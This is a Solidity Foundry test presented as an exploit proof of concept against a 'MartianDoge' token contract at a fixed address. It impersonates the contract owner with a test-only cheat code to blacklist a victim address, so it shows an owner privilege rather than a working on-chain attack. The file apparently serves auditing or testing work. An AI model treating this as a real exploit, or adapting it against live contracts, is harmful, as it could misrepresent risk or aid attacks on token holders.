// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IMartianDoge {
    function owner() external view returns (address);
    function setBlacklist(address account, bool value) external;
    function isBlacklist(address account) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x0Ea9790b1385ce5efAfc273623A013D007e50254;
    address attacker = address(this);
    address victim = address(0x1234567890123456789012345678901234567890);
    IMartianDoge martianDoge;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        martianDoge = IMartianDoge(TARGET);
        vm.label(TARGET, "MartianDoge Contract");
        vm.label(victim, "Victim Address");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the current owner of the contract
        address owner = martianDoge.owner();
        vm.label(owner, "Contract Owner");

        // Impersonate the owner to call privileged function
        vm.startPrank(owner);

        // Blacklist the victim address - this is the exploit
        martianDoge.setBlacklist(victim, true);

        vm.stopPrank();

        // Verify the blacklist was successfully set (Oracle Check)
        assertEq(martianDoge.isBlacklist(victim), true, "Victim should be blacklisted");
        assertEq(martianDoge.isBlacklist(victim), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
